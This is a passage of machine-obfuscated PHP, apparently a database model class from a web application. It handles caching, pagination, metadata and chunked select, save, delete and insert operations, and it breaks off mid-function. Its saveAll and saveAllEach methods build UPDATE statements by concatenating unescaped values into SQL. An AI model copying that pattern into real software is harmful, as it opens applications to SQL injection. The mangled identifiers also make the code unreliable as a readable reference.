textDecode($±é·Õºä) { $ŠÍáÉöİ =& $_SERVER[ÓïÕü]; $–°›ë®‡ = json_encode($±é·Õºä); $–°›ë®‡ = preg_replace_callback($ŠÍáÉöİ[437], function ($ª¸Ù½Ÿ) { return $_SERVER[ÓïÕü][100]; }, $–°›ë®‡); return json_decode($–°›ë®‡); } public function setAutoIncrement($Ÿ±áó¸÷) { $íÍ¸ŸîÔ = array($this->getPk() => $Ÿ±áó¸÷); $»¯‚ü = $this->data($íÍ¸ŸîÔ)->add(); if ($»¯‚ü) { $this->delete($»¯‚ü); } } public function getAutoIncrement() { $­­øûçª = $this->getTableName(); $¢¤¸¹Ç¾ = $this->max($this->getPk()); $ØÈ±«âÌ = $this->query("\163\150\x6f\167\40\164\x61\142\x6c\145\x20\x73\x74\141\x74\x75\163\x20\x77\150\145\x72\145\x20\x4e\141\155\145\x3d\x27{$­­øûçª}\x27"); $ÁÚ·­í = $ØÈ±«âÌ[0][$_SERVER[ÓïÕü][438]]; $¯’Â‘Èº = max($¢¤¸¹Ç¾, $ÁÚ·­í); return $¯’Â‘Èº; } protected function _callBefore($ı×æ¿È×, $óÒÆçøâ) { return $this->cacheCallCheck($ı×æ¿È×, $óÒÆçøâ, !1); } protected function _callAfter($üöúÅ±è, $©øÙíø») { return $this->cacheCallCheck($üöúÅ±è, $©øÙíø», !0); } protected function cacheFunctionAlias($’ØÊ™÷ı) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ª¤‘ı¥–, $¼–ğİò¹, $é™¯È² = false) { $á¸ü¶¡Ï =& $_SERVER[ÓïÕü]; $Òâ”…³¡ = $this->cacheFunctionAlias($¼–ğİò¹); if (!$Òâ”…³¡) { return; } foreach ($Òâ”…³¡ as $åÜÔ¼Àì => $à‹„ºÕÁ) { $ïß»ºƒÎ = $à‹„ºÕÁ[0]; $¯¹ÜĞÖù = explode($á¸ü¶¡Ï[50], $à‹„ºÕÁ[1]); $ò‰§ªî§ = isset($à‹„ºÕÁ[2]) ? $à‹„ºÕÁ[2] : $á¸ü¶¡Ï[12]; if ($ª¤‘ı¥– == $åÜÔ¼Àì) { return $this->cacheFunctionGet($åÜÔ¼Àì, $ïß»ºƒÎ, $ò‰§ªî§); } if ($é™¯È² && in_array($ª¤‘ı¥–, $¯¹ÜĞÖù)) { $this->cacheFunctionClear($åÜÔ¼Àì, $ïß»ºƒÎ, $ò‰§ªî§); } } } public function cacheFunctionGet($Ï¿ĞıÄÃ, $ìöß„ëÅ, $ÈùÆ¾æ = '') { $áÑ´°™Ğ = $this->cacheKeyMake($Ï¿ĞıÄÃ, $ìöß„ëÅ, $ÈùÆ¾æ); $ÀçØØ¹ = Cache::get($áÑ´°™Ğ); if (!is_array($ÀçØØ¹)) { $ÀçØØ¹ = call_user_func_array(array($this, $Ï¿ĞıÄÃ), array($ìöß„ëÅ, !0)); Cache::set($áÑ´°™Ğ, $ÀçØØ¹); } return $ÀçØØ¹; } public function cacheFunctionClear($Ç¶´’ü, $ô××Îå, $è×’Û¤š = '') { $—®«ĞÖÆ = $ô××Îå; if (!is_array($ô××Îå)) { $—®«ĞÖÆ = array($ô××Îå); } foreach ($—®«ĞÖÆ as $ô“Ì½»ø) { $ú¯ßı‡ = $this->cacheKeyMake($Ç¶´’ü, $ô“Ì½»ø, $è×’Û¤š); Cache::remove($ú¯ßı‡); } } public function cacheKeyMake($“ÀÔÛ¥†, $şÑıŒÕ™, $¯ˆ÷àè) { $ÑàûÈ½ =& $_SERVER[ÓïÕü]; if ($¯ˆ÷àè) { $şÑıŒÕ™ = $şÑıŒÕ™ . $ÑàûÈ½[439] . $¯ˆ÷àè; } return get_class($this) . $ÑàûÈ½[11] . $“ÀÔÛ¥† . $ÑàûÈ½[440] . $şÑıŒÕ™; } protected function selectPageReset() { $¡Ø‘šª =& $_SERVER[ÓïÕü]; if (isset($GLOBALS[$¡Ø‘šª[441]])) { return; } $GLOBALS[$¡Ø‘šª[441]] = isset($GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[442]]) ? $GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[442]] : !1; $GLOBALS[$¡Ø‘šª[443]] = isset($GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[431]]) ? $GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[431]] : !1; $GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[442]] = !1; $GLOBALS[$¡Ø‘šª[7]][$¡Ø‘šª[431]] = !1; } protected function selectPageRestore() { $­à‘Ó =& $_SERVER[ÓïÕü]; if (!isset($GLOBALS[$­à‘Ó[441]])) { return; } $GLOBALS[$­à‘Ó[7]][$­à‘Ó[442]] = $GLOBALS[$­à‘Ó[441]]; $GLOBALS[$­à‘Ó[7]][$­à‘Ó[431]] = $GLOBALS[$­à‘Ó[443]]; if ($GLOBALS[$­à‘Ó[7]][$­à‘Ó[442]] === !1) { unset($GLOBALS[$­à‘Ó[7]][$­à‘Ó[442]]); } if ($GLOBALS[$­à‘Ó[7]][$­à‘Ó[431]] === !1) { unset($GLOBALS[$­à‘Ó[7]][$­à‘Ó[431]]); } unset($GLOBALS[$­à‘Ó[441]]); unset($GLOBALS[$­à‘Ó[443]]); } protected function selectPage($‰œ´êçË = 200, $ªíÍ¦¶ = 1) { $öü—ìŠ± =& $_SERVER[ÓïÕü]; global $in; $Îâ›¹ÄË = $this->optionsValue(); $È²õ€Æ = 50000; $‰œ´êçË = isset($in[$öü—ìŠ±[442]]) && $in[$öü—ìŠ±[442]] ? $in[$öü—ìŠ±[442]] : $‰œ´êçË; if ($‰œ´êçË === -1) { $in[$öü—ìŠ±[442]] = !1; $È²õ€Æ = 100000000; $‰œ´êçË = $È²õ€Æ; } $Ü¹Õ­µÅ = $Îâ›¹ÄË; $Ü¹Õ­µÅ[$öü—ìŠ±[444]] = array(); $‰œ´êçË = intval($‰œ´êçË); $‰œ´êçË = $‰œ´êçË <= 5 ? 5 : ($‰œ´êçË >= $È²õ€Æ ? $È²õ€Æ : $‰œ´êçË); $ªíÍ¦¶ = intval(isset($in[$öü—ìŠ±[431]]) && $in[$öü—ìŠ±[431]] ? $in[$öü—ìŠ±[431]] : $ªíÍ¦¶); $ªíÍ¦¶ = $ªíÍ¦¶ <= 1 ? 1 : $ªíÍ¦¶; $÷Ê¡÷ˆä = array(); $ÎÂ‰Ñ­ = 1; if ($ªíÍ¦¶ == 1 && $ÎÂ‰Ñ­) { $this->optionsValue($Îâ›¹ÄË); $÷Ê¡÷ˆä = $this->page($ªíÍ¦¶, $‰œ´êçË)->select(); $ºÂ¨õå« = is_array($÷Ê¡÷ˆä) ? count($÷Ê¡÷ˆä) : 0; if ($ºÂ¨õå« < $‰œ´êçË) { $ŸªâØÏ = 1; } else { $this->optionsValue($Ü¹Õ­µÅ); $ºÂ¨õå« = intval($this->count()); $ŸªâØÏ = ceil($ºÂ¨õå« / $‰œ´êçË); } } else { $this->optionsValue($Ü¹Õ­µÅ); $ºÂ¨õå« = intval($this->count()); $ŸªâØÏ = ceil($ºÂ¨õå« / $‰œ´êçË); $ªíÍ¦¶ = $ªíÍ¦¶ >= $ŸªâØÏ ? $ŸªâØÏ : $ªíÍ¦¶; $this->optionsValue($Îâ›¹ÄË); $÷Ê¡÷ˆä = $this->page($ªíÍ¦¶, $‰œ´êçË)->select(); } if (!is_array($÷Ê¡÷ˆä)) { $÷Ê¡÷ˆä = array(); } if ($ŸªâØÏ == 1) { $ºÂ¨õå« = count($÷Ê¡÷ˆä); } $¹ô¹àóÑ = array($öü—ìŠ±[445] => array($öü—ìŠ±[446] => $ºÂ¨õå«, $öü—ìŠ±[442] => $‰œ´êçË, $öü—ìŠ±[431] => $ªíÍ¦¶, $öü—ìŠ±[447] => $ŸªâØÏ), $öü—ìŠ±[448] => $÷Ê¡÷ˆä); return $¹ô¹àóÑ; } protected function checkLength($òóÒßáƒ, $¬ñÃßÖæ = 0, $…›ş…Ø = '') { $ÛÏœÖåÚ =& $_SERVER[ÓïÕü]; $¬ñÃßÖæ = $¬ñÃßÖæ ? $¬ñÃßÖæ : 65536; if (!$òóÒßáƒ || strlen($òóÒßáƒ) < $¬ñÃßÖæ) { return; } $…›ş…Ø = $…›ş…Ø ? $…›ş…Ø . $ÛÏœÖåÚ[74] : $ÛÏœÖåÚ[12]; show_json($…›ş…Ø . LNG($ÛÏœÖåÚ[449]) . "\50{$¬ñÃßÖæ}\51", !1); } protected function metaSet($şÔÉ±ôˆ, $ÒïÊ³ô = null, $ñÛ” = null) { $†‚ËÒì =& $_SERVER[ÓïÕü]; if (!$this->tableMeta || !$şÔÉ±ôˆ) { return !1; } $ª’³×¼” = $this->tableMeta[$†‚ËÒì[450]]; $ö€íöä = $this->tableMeta[$†‚ËÒì[451]]; $úêÏ „ğ = Model($ö€íöä); $ŞŸ»üã’ = array($ª’³×¼” => $şÔÉ±ôˆ, $†‚ËÒì[452] => $ÒïÊ³ô); if (is_null($ÒïÊ³ô)) { return $úêÏ „ğ->where(array($ª’³×¼” => $şÔÉ±ôˆ))->delete(); } if (is_null($ñÛ”) && is_string($ÒïÊ³ô)) { return $úêÏ „ğ->where($ŞŸ»üã’)->delete(); } $ »ÅÜÜÓ = is_array($ÒïÊ³ô) ? $ÒïÊ³ô : array(); if (is_string($ÒïÊ³ô)) { $ »ÅÜÜÓ[$ÒïÊ³ô] = $ñÛ”; } $ü‰×’œÍ = array(); foreach ($ »ÅÜÜÓ as $†ö’¿ê => $¼Û¶®î) { if (is_null($¼Û¶®î) && is_string($†ö’¿ê)) { $úêÏ „ğ->where(array($ª’³×¼” => $şÔÉ±ôˆ, $†‚ËÒì[452] => $†ö’¿ê))->delete(); continue; } $this->checkLength($¼Û¶®î, !1, $ö€íöä . $†‚ËÒì[4] . $†ö’¿ê); $ü‰×’œÍ[] = array($ª’³×¼” => $şÔÉ±ôˆ, $†‚ËÒì[97] => $†ö’¿ê, $†‚ËÒì[453] => $¼Û¶®î); } $Éµ·˜‘ä = $†‚ËÒì[454] . $ö€íöä; CacheLock::lock($Éµ·˜‘ä); $úêÏ „ğ->where(array($ª’³×¼” => $şÔÉ±ôˆ))->addAll($ü‰×’œÍ, array(), !0); CacheLock::unlock($Éµ·˜‘ä); return !0; } public function metaGet($ÊÌâ­º, $ÈÎŞ¼ó = false) { $Øìü¿Ã‘ =& $_SERVER[ÓïÕü]; if (!$this->tableMeta) { return array(); } $½‹š÷ìË = $this->tableMeta[$Øìü¿Ã‘[450]]; $·Â€¿õœ = Model($this->tableMeta[$Øìü¿Ã‘[451]]); if ($ÈÎŞ¼ó) { $Ó„îÄÌ = array($½‹š÷ìË => $ÊÌâ­º, $Øìü¿Ã‘[97] => $ÈÎŞ¼ó); return $·Â€¿õœ->where($Ó„îÄÌ)->getField($Øìü¿Ã‘[453]); } $Ó„îÄÌ = array($½‹š÷ìË => $ÊÌâ­º); $–šüÎ³ç = $·Â€¿õœ->field($Øìü¿Ã‘[455])->where($Ó„îÄÌ)->select(); $–šüÎ³ç = array_to_keyvalue($–šüÎ³ç, $Øìü¿Ã‘[97], $Øìü¿Ã‘[453]); return $–šüÎ³ç; } private function checkDataAutoHas($Òœù›—ƒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ô­¦Í×) { if (in_array($Òœù›—ƒ, explode($_SERVER[ÓïÕü][50], $ô­¦Í×[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$©Ÿ›‡œı, $éõÍÌ‘ì) { $ŒÉÇëÖ =& $_SERVER[ÓïÕü]; if (!is_array($©Ÿ›‡œı)) { return; } foreach ($this->dataAuto as $š¬†µ) { $Ö”Ûè¡ = $š¬†µ[0]; if (!in_array($éõÍÌ‘ì, explode($ŒÉÇëÖ[50], $š¬†µ[2]))) { continue; } switch (trim($š¬†µ[3])) { case $ŒÉÇëÖ[399]: case $ŒÉÇëÖ[400]: $Šàà¹™ü = $š¬†µ[1]; $±ÂÏÚöØ = isset($š¬†µ[4]) ? (array) $š¬†µ[4] : array(); if ($Šàà¹™ü == $ŒÉÇëÖ[207] && array_key_exists($Ö”Ûè¡, $©Ÿ›‡œı)) { if (!$©Ÿ›‡œı[$Ö”Ûè¡]) { unset($©Ÿ›‡œı[$Ö”Ûè¡]); } break; } if (isset($©Ÿ›‡œı[$Ö”Ûè¡])) { array_unshift($±ÂÏÚöØ, $©Ÿ›‡œı[$Ö”Ûè¡]); } if ($ŒÉÇëÖ[399] == $š¬†µ[3]) { $©Ÿ›‡œı[$Ö”Ûè¡] = call_user_func_array($Šàà¹™ü, $±ÂÏÚöØ); } else { $©Ÿ›‡œı[$Ö”Ûè¡] = call_user_func_array(array(&$this, $Šàà¹™ü), $±ÂÏÚöØ); } break; case $ŒÉÇëÖ[350]: if (isset($©Ÿ›‡œı[$Ö”Ûè¡]) && $©Ÿ›‡œı[$Ö”Ûè¡]) { $©Ÿ›‡œı[$Ö”Ûè¡] = call_user_func_array(array(&$this, $š¬†µ[1]), array($©Ÿ›‡œı[$Ö”Ûè¡])); } break; case $ŒÉÇëÖ[353]: $©Ÿ›‡œı[$Ö”Ûè¡] = $©Ÿ›‡œı[$š¬†µ[1]]; break; case $ŒÉÇëÖ[372]: if (isset($©Ÿ›‡œı[$Ö”Ûè¡]) && !is_string($©Ÿ›‡œı[$Ö”Ûè¡])) { $©Ÿ›‡œı[$Ö”Ûè¡] = json_encode_force($©Ÿ›‡œı[$Ö”Ûè¡]); } break; case $ŒÉÇëÖ[401]: if ($©Ÿ›‡œı[$Ö”Ûè¡] === $ŒÉÇëÖ[12]) { unset($©Ÿ›‡œı[$Ö”Ûè¡]); } break; case $ŒÉÇëÖ[402]: $©Ÿ›‡œı[$Ö”Ûè¡] = $š¬†µ[1]; default: break; } } if ($éõÍÌ‘ì == $ŒÉÇëÖ[433]) { $ »è°âÄ = strtolower($this->db->getDbType()); if (strpos($ »è°âÄ, $ŒÉÇëÖ[13]) !== 0) { return; } $“‰½„¹ = $this->field(!0)->fields; $‡«ïê°ê = $“‰½„¹[$ŒÉÇëÖ[332]]; if (isset($“‰½„¹[$ŒÉÇëÖ[331]])) { unset($‡«ïê°ê[$“‰½„¹[$ŒÉÇëÖ[331]]]); } foreach ($‡«ïê°ê as $¬™§ˆöğ => $éõÍÌ‘ì) { if (!isset($©Ÿ›‡œı[$¬™§ˆöğ])) { $©Ÿ›‡œı[$¬™§ˆöğ] = $ŒÉÇëÖ[12]; } } } } private function dataAfterFilter(&$÷ñÎ²ú•) { $õÁåøˆÛ =& $_SERVER[ÓïÕü]; foreach ($this->dataAuto as $Íëã×¹ë) { $Ö÷¶Ò = $Íëã×¹ë[0]; if (!isset($÷ñÎ²ú•[$Ö÷¶Ò])) { continue; } if (!in_array($õÁåøˆÛ[435], explode($õÁåøˆÛ[50], $Íëã×¹ë[2]))) { continue; } switch (trim($Íëã×¹ë[3])) { case $õÁåøˆÛ[399]: case $õÁåøˆÛ[400]: $†·Ö¬Ê¾ = isset($Íëã×¹ë[4]) ? (array) $Íëã×¹ë[4] : array(); array_unshift($†·Ö¬Ê¾, $÷ñÎ²ú•[$Ö÷¶Ò]); if (isset($Íëã×¹ë[4]) && $Íëã×¹ë[4] == $õÁåøˆÛ[456]) { $†·Ö¬Ê¾ = array($÷ñÎ²ú•[$Ö÷¶Ò]); } if ($õÁåøˆÛ[399] == $Íëã×¹ë[3]) { $÷ñÎ²ú•[$Ö÷¶Ò] = call_user_func_array($Íëã×¹ë[1], $†·Ö¬Ê¾); } else { $÷ñÎ²ú•[$Ö÷¶Ò] = call_user_func_array(array(&$this, $Íëã×¹ë[1]), $†·Ö¬Ê¾); } break; case $õÁåøˆÛ[350]: if (isset($÷ñÎ²ú•[$Ö÷¶Ò]) && $÷ñÎ²ú•[$Ö÷¶Ò]) { $÷ñÎ²ú•[$Ö÷¶Ò] = call_user_func_array(array(&$this, $Íëã×¹ë[1]), array($÷ñÎ²ú•[$Ö÷¶Ò])); } break; case $õÁåøˆÛ[353]: $÷ñÎ²ú•[$Ö÷¶Ò] = $÷ñÎ²ú•[$Íëã×¹ë[1]]; break; case $õÁåøˆÛ[372]: $Ô€½íÔã = $÷ñÎ²ú•[$Ö÷¶Ò]; $÷ñÎ²ú•[$Ö÷¶Ò] = json_decode($Ô€½íÔã, !0); if (is_null($÷ñÎ²ú•[$Ö÷¶Ò])) { $÷ñÎ²ú•[$Ö÷¶Ò] = $Ô€½íÔã; } break; case $õÁåøˆÛ[401]: if ($÷ñÎ²ú•[$Ö÷¶Ò] === $õÁåøˆÛ[12]) { unset($÷ñÎ²ú•[$Ö÷¶Ò]); } break; case $õÁåøˆÛ[402]: $÷ñÎ²ú•[$Ö÷¶Ò] = $Íëã×¹ë[1]; break; default: break; } } } public function saveAll($ŠÏİ¨×) { $Õ“·Õåá =& $_SERVER[ÓïÕü]; $Ï¼Ò™şñ = $this->tablePrefix . $this->tableName; $¦‚“ò† = self::SQL_WHERE_IN_CHUNK; $ŠÏİ¨× = is_array($ŠÏİ¨×) ? $ŠÏİ¨× : array(); $Û•‰‚óÅ = $Õ“·Õåá[457]; $Òôû˜Ô¦ = 0; $Û ŞÑ‹ = array(); $ó¸é„‚ = count($ŠÏİ¨×); for ($ñ¥¢‚Ò¼ = 0; $ñ¥¢‚Ò¼ < $ó¸é„‚; $ñ¥¢‚Ò¼++) { $×¿…‚‰Ò = $ŠÏİ¨×[$ñ¥¢‚Ò¼]; if (!is_array($×¿…‚‰Ò) || count($×¿…‚‰Ò) != 4) { continue; } $€¸°àû‘ = "\125\x50\104\101\x54\x45\x20\x60{$Ï¼Ò™şñ}\140\40\x53\x45\124\x20{$×¿…‚‰Ò[2]}\x20\75\x20\103\101\x53\x45\40{$×¿…‚‰Ò[0]}\x20\12"; if ($Òôû˜Ô¦ == 0) { $Û•‰‚óÅ = $€¸°àû‘; } $Û ŞÑ‹[] = $Õ“·Õåá[121] . $×¿…‚‰Ò[1] . $Õ“·Õåá[121]; $Òôû˜Ô¦++; $Û•‰‚óÅ .= "\x20\x57\x48\105\116\x20\x27{$×¿…‚‰Ò[1]}\47\x20\124\110\x45\116\x20\47{$×¿…‚‰Ò[3]}\x27\x20\12"; if ($Òôû˜Ô¦ == $¦‚“ò† || $ñ¥¢‚Ò¼ == $ó¸é„‚ - 1) { $†ùğÒà¥ = implode($Õ“·Õåá[50], $Û ŞÑ‹); $Û•‰‚óÅ .= "\40\x45\116\x44\x20\x20\127\x48\105\x52\x45\40{$×¿…‚‰Ò[0]}\x20\111\x4e\x20\50{$†ùğÒà¥}\51\40"; $this->execute($Û•‰‚óÅ); $Òôû˜Ô¦ = 0; $Û•‰‚óÅ = $€¸°àû‘; $this->chunkEventCheck(count($Û ŞÑ‹)); $Û ŞÑ‹ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ü»¶â™) { $çûû¦¥Ë =& $_SERVER[ÓïÕü]; $×ø¨ªÊÛ = $this->tablePrefix . $this->tableName; foreach ($Ü»¶â™ as $÷€Õ…äª) { if (!is_array($÷€Õ…äª) || count($÷€Õ…äª) != 4) { continue; } $ı¾ª« = $÷€Õ…äª[0] . $çûû¦¥Ë[458] . $÷€Õ…äª[1] . $çûû¦¥Ë[121]; $”›É£•æ = $÷€Õ…äª[2] . $çûû¦¥Ë[458] . $÷€Õ…äª[3] . $çûû¦¥Ë[121]; $›´º•¯ = "\165\160\144\x61\x74\145\40{$×ø¨ªÊÛ}\40\163\145\x74\x20{$”›É£•æ}\40\167\150\x65\162\x65\40{$ı¾ª«}\x3b"; $this->execute($›´º•¯); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($›ãşã™î = false, $’†¢æã¿ = false) { $this->_chunkEvent = $›ãşã™î; $this->_chunkEventParam = $’†¢æã¿; } private function chunkEventCheck($‡Í´„ˆÌ) { if (!$this->_chunkEvent) { return; } $Ö¨Øœ«¨ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ö¨Øœ«¨[$_SERVER[ÓïÕü][459]] = $‡Í´„ˆÌ; Hook::trigger($this->_chunkEvent, $Ö¨Øœ«¨); } public function addAll($ê–›«Ô‰, $°Ã‹Å©É = array(), $¸£š“ = false) { $±Ê»¡åŠ =& $_SERVER[ÓïÕü]; ignore_timeout(); $Ì‰Ö¸æ÷ = self::SQL_WHERE_IN_CHUNK; if (empty($ê–›«Ô‰)) { $this->error = think_lang($±Ê»¡åŠ[351]); return !1; } $°Ã‹Å©É = $this->_parseOptions($°Ã‹Å©É); foreach ($ê–›«Ô‰ as $÷Ğ´¥®Ò => $Œ©‡¬†é) { $ê–›«Ô‰[$÷Ğ´¥®Ò] = $this->_facade($Œ©‡¬†é); $this->_beforeInsert($ê–›«Ô‰[$÷Ğ´¥®Ò], $°Ã‹Å©É); } if (method_exists($this->db, $±Ê»¡åŠ[352])) { for ($ˆÎŸÍ×† = 0; $ˆÎŸÍ×† < count($ê–›«Ô‰); $ˆÎŸÍ×† += $Ì‰Ö¸æ÷) { $§”Â€Ÿ™ = array_slice($ê–›«Ô‰, $ˆÎŸÍ×†, $Ì‰Ö¸æ÷); if (!is_array($§”Â€Ÿ™) || count($§”Â€Ÿ™) == 0) { break; } $ÏÊèÉé = $this->db->insertAll($§”Â€Ÿ™, $°Ã‹Å©É, $¸£š“); $this->chunkEventCheck(count($§”Â€Ÿ™)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ê–›«Ô‰ as $÷Ğ´¥®Ò => $Œ©‡¬†é) { $ÏÊèÉé = $this->db->insert($Œ©‡¬†é, $°Ã‹Å©É, $¸£š“); } $this->commit(); } if (!1 !== $ÏÊèÉé) { $‰ÑòÜ÷™ = $this->getLastInsID(); if ($‰ÑòÜ÷™) { return $‰ÑòÜ÷™; } } return $ÏÊèÉé; } public function save($ÆêÄïĞ» = '', $ØÈØŠŸÊ = array()) { $‘ëş÷øÖ =& $_SERVER[ÓïÕü]; $³½åÀœ = self::SQL_WHERE_IN_CHUNK; $’íöÛÚÍ = $this->optionsValue(); $ô…¹’²Ğ = $this->findWhereField($’íöÛÚÍ); if (!$ô…¹’²Ğ) { return parent::save($ÆêÄïĞ», $ØÈØŠŸÊ); } $ıú¬÷ş© = 0; $›ÊÀàÀå = $’íöÛÚÍ[$‘ëş÷øÖ[355]][$ô…¹’²Ğ][1]; $›ÊÀàÀå = is_array($›ÊÀàÀå) ? $›ÊÀàÀå : array(); $×ƒÉÇ‡Ï = count($›ÊÀàÀå); for ($»÷…òÊ„ = 0; $»÷…òÊ„ < $×ƒÉÇ‡Ï; $»÷…òÊ„ += $³½åÀœ) { $¼²²¤µ = array_slice($›ÊÀàÀå, $»÷…òÊ„, $³½åÀœ); if (!is_array($¼²²¤µ) || count($¼²²¤µ) == 0) { break; } $’íöÛÚÍ[$‘ëş÷øÖ[355]][$ô…¹’²Ğ][1] = $¼²²¤µ; $this->optionsValue($’íöÛÚÍ); $ıú¬÷ş© += parent::save($ÆêÄïĞ», $ØÈØŠŸÊ); $this->chunkEventCheck(count($¼²²¤µ)); } $this->chunkEventSet(); return $ıú¬÷ş©; } public function add($²ğšÃº® = '', $í“è°ê„ = array(), $ƒ¬Í†“¶ = false) { if ($this->addTaskStatus && is_array($²ğšÃº®)) { $this->addTaskData[] = $²ğšÃº®; return; } return parent::add($²ğšÃº®, $í“è°ê„, $ƒ¬Í†“¶); } public function parseWhereLike($“·²¡ŒÅ, $îÔÁàğĞ = '', $ùÅì˜³‡ = false, &$ÏÍÕ·¶ = false) { $²Ê¬–¾š =& $_SERVER[ÓïÕü]; $ÎÈ–ÜÅ = $GLOBALS[$²Ê¬–¾š[6]][$²Ê¬–¾š[460]]; if (!$ÎÈ–ÜÅ[$²Ê¬–¾š[461]]) { return $“·²¡ŒÅ; } if (!is_array($“·²¡ŒÅ)) { return $“·²¡ŒÅ; } $Øü¬›Ç = array(); $ÚşãÓú = 0; foreach ($“·²¡ŒÅ as $ä“õ†– => $Èæ»Î»İ) { if (is_array($Èæ»Î»İ) && count($Èæ»Î»İ) == 2 && $Èæ»Î»İ[0] == $²Ê¬–¾š[462] && is_string($Èæ»Î»İ[1]) && substr($Èæ»Î»İ[1], 0, 1) == $²Ê¬–¾š[463] && substr($Èæ»Î»İ[1], strlen($Èæ»Î»İ[1]) - 1, 1) == $²Ê¬–¾š[463]) { $ÏÍÕ·¶ = !0; $ğé£îÅú = is_string($ä“õ†–) ? $ä“õ†– : $îÔÁàğĞ; $Åï±Ï¨§ = substr($Èæ»Î»İ[1], 1, strlen($Èæ»Î»İ[1]) - 2); $Åï±Ï¨§ = $this->db->escapeString($Åï±Ï¨§); if (!strpos($ğé£îÅú, $²Ê¬–¾š[10])) { $ğé£îÅú = $²Ê¬–¾š[464] . $ğé£îÅú . $²Ê¬–¾š[464]; } $‹˜¦¤ïß = $²Ê¬–¾š[223] . $Åï±Ï¨§ . $²Ê¬–¾š[223]; $Åï±Ï¨§ = str_replace(array($²Ê¬–¾š[10], $²Ê¬–¾š[465], $²Ê¬–¾š[11]), $²Ê¬–¾š[466], $Åï±Ï¨§); if ($ÎÈ–ÜÅ[$²Ê¬–¾š[467]]) { $‹˜¦¤ïß = $²Ê¬–¾š[468] . $Åï±Ï¨§ . $²Ê¬–¾š[469]; if ($ÎÈ–ÜÅ[$²Ê¬–¾š[470]]) { $‹˜¦¤ïß = $²Ê¬–¾š[469] . $Åï±Ï¨§ . $²Ê¬–¾š[468]; } } $Øü¬›Ç[$ÚşãÓú] = $²Ê¬–¾š[471] . $ğé£îÅú . $²Ê¬–¾š[472] . $‹˜¦¤ïß . $²Ê¬–¾š[473]; $ÚşãÓú++; continue; } if (is_array($Èæ»Î»İ)) { $îÔÁàğĞ = is_string($ä“õ†–) ? $ä“õ†– : $îÔÁàğĞ; $Èæ»Î»İ = $this->parseWhereLike($Èæ»Î»İ, $îÔÁàğĞ, !0, $ÏÍÕ·¶); } if (is_numeric($ä“õ†–)) { $Øü¬›Ç[$ÚşãÓú] = $Èæ»Î»İ; $ÚşãÓú++; } else { $Øü¬›Ç[$ä“õ†–] = $Èæ»Î»İ; } } if ($ÏÍÕ·¶ && !$ùÅì˜³‡) { } return $Øü¬›Ç; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¤É›áÃ¢ = array()) { $ÓªòŸü =& $_SERVER[ÓïÕü]; $úÛÁ¦¶€ = self::SQL_WHERE_IN_CHUNK; $¸™·…Ü = $this->optionsValue(); $ç‘±àğÇ = $this->findWhereField($¸™·…Ü); if (!$ç‘±àğÇ || isset($¸™·…Ü[$ÓªòŸü[370]]) || isset($¸™·…Ü[$ÓªòŸü[431]])) { return parent::select($¤É›áÃ¢); } $Á¼´½ÇÅ = $¸™·…Ü[$ÓªòŸü[355]][$ç‘±àğÇ][1]; $Á¼´½ÇÅ = is_array($Á¼´½ÇÅ) ? $Á¼´½ÇÅ : array(); $ƒíåäµ› = null; for ($‚ö“™Æ = 0; $‚ö“™Æ < count($Á¼´½ÇÅ); $‚ö“™Æ += $úÛÁ¦¶€) { $Õ¸™à¶² = array_slice($Á¼´½ÇÅ, $‚ö“™Æ, $úÛÁ¦¶€); if (!is_array($Õ¸™à¶²) || count($Õ¸™à¶²) == 0) { break; } $¸™·…Ü[$ÓªòŸü[355]][$ç‘±àğÇ][1] = $Õ¸™à¶²; $this->optionsValue($¸™·…Ü); $Çì¢Á‘Œ = parent::select($¤É›áÃ¢); if (!$Çì¢Á‘Œ) { continue; } $ƒíåäµ› = is_array($ƒíåäµ›) ? $ƒíåäµ› : array(); $ƒíåäµ› = array_merge($ƒíåäµ›, $Çì¢Á‘Œ); } return $ƒíåäµ›; } public function delete($›±Ú…Ô» = array()) { $Á‘óÖ¸» =& $_SERVER[ÓïÕü]; $÷ôÎ‡ô = self::SQL_WHERE_IN_CHUNK; $¬„ùÙŠù = $this->optionsValue(); $½¡¦†¢ = $this->findWhereField($¬„ùÙŠù); if (!$½¡¦†¢) { return parent::delete($›±Ú…Ô»); } $¥‡Â¢¸Á = 0; $ˆêõÈ›Ò = $¬„ùÙŠù[$Á‘óÖ¸»[355]][$½¡¦†¢][1]; $ˆêõÈ›Ò = is_array($ˆêõÈ›Ò) ? $ˆêõÈ›Ò : array(); for ($’“‰¦ƒÊ = 0; $’“‰¦ƒÊ < count($ˆêõÈ›Ò); $’“‰¦ƒÊ += $÷ôÎ‡ô) { $ÊÆº­Æ» = array_slice($ˆêõÈ›Ò, $’“‰¦ƒÊ, $÷ôÎ‡ô); if (!is_array($ÊÆº­Æ») || count($ÊÆº­Æ») == 0) { break; } $¬„ùÙŠù[$Á‘óÖ¸»[355]][$½¡¦†¢][1] = $ÊÆº­Æ»; $this->optionsValue($¬„ùÙŠù); $¥‡Â¢¸Á += parent::delete($›±Ú…Ô»); } return $¥‡Â¢¸Á; } private function findWhereField($„‚üğ¼É) { $©‚¿Üñ =& $_SERVER[ÓïÕü]; $öÈ‚ò†Ğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($„‚üğ¼É) || !is_array($„‚üğ¼É[$©‚¿Üñ[355]])) { return !1; } foreach ($„‚üğ¼É[$©‚¿Üñ[355]] as $ûÍØåÅ => $”«ËâÔ) { if (is_array($”«ËâÔ) && isset($”«ËâÔ[0]) && is_string($”«ËâÔ[0]) && strtolower($”«ËâÔ[0]) == $©‚¿Üñ[7] && is_array($”«ËâÔ[1]) && count($”«ËâÔ[1]) > $öÈ‚ò†Ğ) { ignore_timeout(); return 